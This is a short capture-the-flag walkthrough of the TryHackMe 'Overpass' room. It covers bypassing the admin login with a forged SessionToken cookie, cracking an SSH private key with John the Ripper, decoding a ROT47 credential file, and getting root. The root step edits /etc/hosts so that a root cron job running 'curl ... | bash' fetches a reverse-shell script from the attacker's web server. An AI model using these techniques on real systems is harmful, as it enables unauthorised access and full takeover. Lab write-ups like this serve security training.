
https://tryhackme.com/r/room/overpass

---
#### Nmap
![[Screenshot_2024-05-26_16-53-08.png]]
#### Path `/`
![[Screenshot_2024-05-26_17-02-20.png]]
#### Path `/downloads`
![[Screenshot_2024-05-26_17-11-31.png]]

I think the key is in `http://10.10.59.69/admin/login.js`, no need to enum the all world

I had to setup a cookie variable from `js-cookie`
```javascript
Cookie.set("SessionToken","Hello")
```

It was enough to bring me on hidden admin page containing a username `james` and a `RSA Private Key` to crack
```shell
ssh2john rsa > hash
```

```shell
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

The credentials are `james:james13`

```shell
ssh james@10.10.59.69 -i rsa
```

And here I m in

There is a hidden file `.overpass` on james' home containing:
```text
,LQ?2>6QiQ$JDE6>Q[QA2DDQiQD2J5C2H?=J:?8A:4EFC6QN.
```

In was a ROT 47
```text
[{"name":"System","pass":"saydrawnlyingpicture"}]
```

The `pass` is james' password on the system

There is a `/usr/bin/overpass` binary
And there is a crontab job:
```shell
* * * * * root curl overpass.thm/downloads/src/buildscript.sh | bash
```

The `sudo Baton Samedit 2` came to help me elevate root again

So the real solution was in the writable `/etc/hosts`. I replaced
```text
127.0.0.1 overpass.thm
```
With
```text
10.14.79.56 overpass.thm
```

Then I created a `/www/downloads/src/` with with a `buildscript.sh` containing a reverse shell and I setup a webserver in `/www` on port `80`:
```shell
python3 -m http.server 80
```

